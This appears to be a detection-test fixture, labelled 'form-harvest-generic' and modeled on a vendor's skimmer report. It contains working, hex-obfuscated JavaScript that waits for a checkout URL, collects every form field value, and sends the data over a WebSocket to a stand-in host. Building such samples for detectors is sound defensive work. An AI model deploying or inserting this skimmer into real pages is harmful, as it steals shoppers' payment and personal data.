// expect: form-harvest-generic
// Modeled on the same cside report, stage 3: no card-field names at all. Every input on the one-step
// checkout is collected, hex-encoded and sent over a WebSocket whose URL is hex-decoded at runtime.
function h(s) { return s.match(/.{2}/g).map((o) => String.fromCharCode(parseInt(o, 16))).join(''); }
function hexEncode(s) { return s.split('').map((c) => c.charCodeAt(0).toString(16)).join(''); }
const iv = setInterval(() => {
  if (!window.location.href.includes(h('6f6e65737465706368656b6f7574'))) return;
  const data = {};
  document.querySelectorAll('input, select, textarea').forEach((el) => { if (el.value) data[el.name || el.id] = el.value; });
  data.url = location.hostname; data.ts = Date.now();
  const ws = new WebSocket(h('7773733a2f2f6d6574726963732e6578616d706c652f7773') + '/' + crypto.randomUUID());
  ws.addEventListener('open', () => { ws.send(hexEncode(JSON.stringify(data))); ws.close(1000, 'done'); clearInterval(iv); });
}, 1000);
